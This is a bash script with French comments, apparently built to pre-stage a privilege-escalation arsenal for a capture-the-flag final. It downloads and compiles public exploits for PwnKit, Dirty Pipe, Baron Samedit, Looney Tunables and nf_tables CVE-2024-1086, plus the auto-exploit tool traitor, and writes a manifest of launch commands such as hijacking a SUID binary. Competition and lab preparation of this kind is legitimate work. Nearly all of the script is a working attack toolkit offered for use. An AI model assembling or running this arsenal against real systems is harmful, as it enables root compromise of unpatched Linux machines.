#!/usr/bin/env bash
# =====================================================================
# NCTF26 FINALE — pre-stage de l'arsenal privesc (hors-ligne, A&D/KoTH)
# Telecharge des PoC PUBLICS canoniques + auto-privesc, compile en statique
# quand possible, pour NE PAS compiler sur la cible le jour J.
#
#   bash fetch_privesc_arsenal.sh
#
# ⚠️ A n'utiliser que sur des cibles IN-SCOPE (box du jeu). Les binaires
# prebuilt tiers sont UNTRUSTED : stages seulement, ne pas les executer sur
# cette machine ; chmod +x cote cible. Provenance notee dans MANIFEST.md.
# =====================================================================
set -u
cd "$(dirname "$0")/privesc-arsenal" || exit 1
ARS="$(pwd)"
UA="Mozilla/5.0 (CTF-prep)"
dl(){ curl -fsSL --connect-timeout 20 -m 180 -A "$UA" "$1" -o "$2" && echo "  [OK] $2" || echo "  [!!] echec: $1"; }
note(){ echo "$@" >> "$ARS/MANIFEST.md"; }

: > "$ARS/MANIFEST.md"
note "# Arsenal privesc — pré-staged $(date '+%Y-%m-%d %H:%M'). IN-SCOPE uniquement."
note ""
note "| Fichier | CVE / rôle | Cible | Lancer (sur la box, chmod +x d'abord) |"
note "|---|---|---|---|"

echo "== 1. Enumeration =="
dl "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" "linpeas.sh"
note "| linpeas.sh | énum privesc complète | tout Linux | \`sh linpeas.sh\` (ou \`-a\` tout) |"

echo "== 2. Auto-privesc (statique, tout-en-un) =="
mkdir -p bin
dl "https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64" "bin/traitor-amd64"
note "| bin/traitor-amd64 | auto-exploit sudo/SUID/caps/docker/CVE | Linux x86-64 (static Go) | \`./traitor-amd64 -a\` (auto) |"
dl "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64" "bin/pspy64"
note "| bin/pspy64 | voir process/cron sans root (recon A&D) | Linux x86-64 (static) | \`./pspy64\` |"

echo "== 3. PwnKit CVE-2021-4034 (pkexec) — binaire autonome + source =="
mkdir -p pwnkit
# binaire statique autonome (pas besoin de gcc sur la cible)
dl "https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit" "pwnkit/PwnKit"
note "| pwnkit/PwnKit | CVE-2021-4034 pkexec (static, sans gcc cible) | pkexec ≤ 2022, quasi universel | \`./PwnKit\` |"
# source canonique (compile locale -> binaire)
git clone -q --depth 1 https://github.com/berdav/CVE-2021-4034 pwnkit/berdav 2>/dev/null \
  && (cd pwnkit/berdav && make >/dev/null 2>&1 && echo "  [OK] berdav compilé") \
  || echo "  [~] berdav clone/compile best-effort"

echo "== 4. Dirty Pipe CVE-2022-0847 (compile statique) =="
mkdir -p dirtypipe
dl "https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c" "dirtypipe/dirtypipez.c"
if [ -s dirtypipe/dirtypipez.c ]; then
  gcc -static -O2 -o dirtypipe/dirtypipez dirtypipe/dirtypipez.c 2>/dev/null \
    && echo "  [OK] dirtypipez (static)" \
    || (gcc -o dirtypipe/dirtypipez dirtypipe/dirtypipez.c 2>/dev/null && echo "  [OK] dirtypipez (dynamique)") \
    || echo "  [!!] compile dirtypipez"
  note "| dirtypipe/dirtypipez | CVE-2022-0847 Dirty Pipe | kernel 5.8–5.16.11 | \`./dirtypipez /usr/bin/su\` (hijack un SUID) |"
fi

echo "== 5. Baron Samedit CVE-2021-3156 (python, pas de compile) =="
git clone -q --depth 1 https://github.com/worawit/CVE-2021-3156 baron-samedit 2>/dev/null \
  && echo "  [OK] baron-samedit (worawit)" || echo "  [~] baron-samedit clone"
note "| baron-samedit/ | CVE-2021-3156 sudo<1.9.5p2 | selon libc/distro | \`python3 exploit_nss.py\` (lire README) |"

echo "== 6. Sources de référence (récents, compile selon kernel/libc sur place) =="
git clone -q --depth 1 https://github.com/leesh3288/CVE-2023-4911 looney-tunables 2>/dev/null && echo "  [OK] looney-tunables (src)" || echo "  [~] looney src"
git clone -q --depth 1 https://github.com/Notselwyn/CVE-2024-1086 nftables-1086 2>/dev/null && echo "  [OK] nf_tables CVE-2024-1086 (src)" || echo "  [~] nf_tables src"
note "| looney-tunables/ | CVE-2023-4911 glibc ld.so | glibc 2.34+ (version-spécifique) | compiler sur place (README) |"
note "| nftables-1086/ | CVE-2024-1086 nf_tables | kernel 5.14–6.6 | compiler sur place (README) |"

# sécurité locale : retirer +x des binaires prebuilt untrusted pour éviter une exécution accidentelle ici
chmod -x bin/* pwnkit/PwnKit 2>/dev/null || true
note ""
note "Rappel : binaires prebuilt tiers = UNTRUSTED. Non exécutables localement par défaut ;"
note "\`chmod +x\` seulement sur la cible in-scope. Pré-stage le 2026-11-15 pour la finale."

echo ""
echo "== Inventaire =="
find "$ARS" -maxdepth 2 -type f | sed "s#$ARS/##" | sort
echo "== MANIFEST : $ARS/MANIFEST.md =="
